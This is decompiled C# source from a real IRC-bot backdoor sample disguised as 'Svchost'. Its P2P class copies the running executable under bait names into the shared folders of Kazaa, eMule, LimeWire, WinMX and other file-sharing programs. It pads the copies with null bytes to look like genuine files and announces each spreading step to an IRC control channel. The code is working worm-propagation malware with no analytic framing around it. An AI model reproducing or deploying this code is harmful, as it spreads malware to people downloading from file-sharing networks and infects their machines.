// Decompiled with JetBrains decompiler
// Type: myApp.P2P
// Assembly: Svchost, Version=1.0.3797.25400, Culture=neutral, PublicKeyToken=null
// MVID: E157A03A-FE69-4E7B-AD46-73B5B6218564
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.fy-ac791d112cad6f2a883c24cb5a554f1a826fa0afc8bb0e0be6dada5ff2c5a16d.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace myApp
{
  internal class P2P
  {
    private static string progpath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

    public static void ShareazaStart(string filetoadd)
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Shareaza\\Shareaza\\Downloads", false);
      if (registryKey == null)
        return;
      P2P.Copyfromlist(registryKey.GetValue("CollectionPath").ToString() + "\\", filetoadd);
    }

    public static void EmuleStart(string filetoadd)
    {
      string cPath1 = Environment.GetFolderPath(Environment.SpecialFolder.Personal).Replace("Documents", "Downloads\\eMule\\Incoming\\");
      string cPath2 = P2P.progpath + "\\emule\\incoming\\";
      P2P.Copyfromlist(cPath1, filetoadd);
      P2P.Copyfromlist(cPath2, filetoadd);
    }

    public static void KazaaStart(string filetoadd)
    {
      string cPath1 = P2P.progpath + "\\kazaa\\my shared folder\\";
      string cPath2 = P2P.progpath + "\\kazaa lite\\my shared folder\\";
      string cPath3 = P2P.progpath + "\\kazaa lite k++\\my shared folder\\";
      P2P.Copyfromlist(cPath1, filetoadd);
      P2P.Copyfromlist(cPath2, filetoadd);
      P2P.Copyfromlist(cPath3, filetoadd);
    }

    public static void IcqStart(string filetoadd) => P2P.Copyfromlist(P2P.progpath + "\\icq\\shared folder\\", filetoadd);

    public static void GroksterStart(string filetoadd) => P2P.Copyfromlist(P2P.progpath + "\\grokster\\my grokster\\", filetoadd);

    public static void BearshareStart(string filetoadd) => P2P.Copyfromlist(P2P.progpath + "\\bearshare\\shared\\", filetoadd);

    public static void Edonkey2000Start(string filetoadd) => P2P.Copyfromlist(P2P.progpath + "\\edonkey2000\\incoming\\", filetoadd);

    public static void MorpheusStart(string filetoadd) => P2P.Copyfromlist(P2P.progpath + "\\morpheus\\my shared folder\\", filetoadd);

    public static void LimewireStart(string filetoadd) => P2P.Copyfromlist(P2P.progpath + "\\limewire\\shared\\", filetoadd);

    public static void TeslaStart(string filetoadd) => P2P.Copyfromlist(P2P.progpath + "\\tesla\\files\\", filetoadd);

    public static void WinmxStart(string filetoadd) => P2P.Copyfromlist(P2P.progpath + "\\winmx\\shared\\", filetoadd);

    public static void Copyfromlist(string cPath, string rlzname)
    {
      if (!Directory.Exists(cPath))
        return;
      Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  \u00038Spreading in : " + cPath + rlzname);
      if (File.Exists(cPath + rlzname))
        return;
      try
      {
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, cPath + rlzname, true);
        FileStream fileStream = File.OpenWrite(cPath + rlzname);
        long num1 = fileStream.Seek(0L, SeekOrigin.End);
        Decimal num2 = (Decimal) (Convert.ToInt32(rlzname.Length) * 10485);
        while ((Decimal) num1 < num2)
        {
          ++num1;
          fileStream.WriteByte((byte) 0);
        }
        fileStream.Close();
      }
      catch
      {
      }
    }
  }
}
